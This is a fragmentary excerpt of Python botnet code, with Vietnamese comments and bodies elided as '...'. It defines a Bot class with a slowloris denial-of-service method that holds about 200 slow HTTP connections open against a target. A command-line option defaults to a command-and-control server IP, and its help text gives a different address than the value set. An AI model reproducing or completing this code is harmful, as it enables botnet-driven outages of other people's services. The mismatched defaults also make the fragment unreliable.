...
class Bot:
    ...
    def slowloris(self, target):
        ...
        startTime = time.time()
        connections = []
        max_connections = 200  # Giảm số kết nối để tránh giới hạn
        keep_alive_interval = 5  # Gửi keep-alive mỗi 5 giây

        # Hàm gửi tiêu đề HTTP ban đầu
        def send_initial_header(sock, target_ip):
            ...
            for header in headers:
                ...
                time.sleep(0.01)  # Gửi chậm để mô phỏng Slowloris
        ...
        try:
            while time.time() < startTime + timeout:
                for i, conn in enumerate(connections[:]):
                    try:
                        # Gửi tiêu đề keep-alive hợp lệ hơn
                ...
                time.sleep(keep_alive_interval / max_connections)  # Khoảng 0.025 giây mỗi kết nối
...
if __name__ == '__main__':
    ...
    parser.add_argument('-c', '--cnc-ip', dest='cnc_ip', action='store', required=False, default='18.142.246.109', help='IP address of the C&C server. Default is 52.77.255.218.')
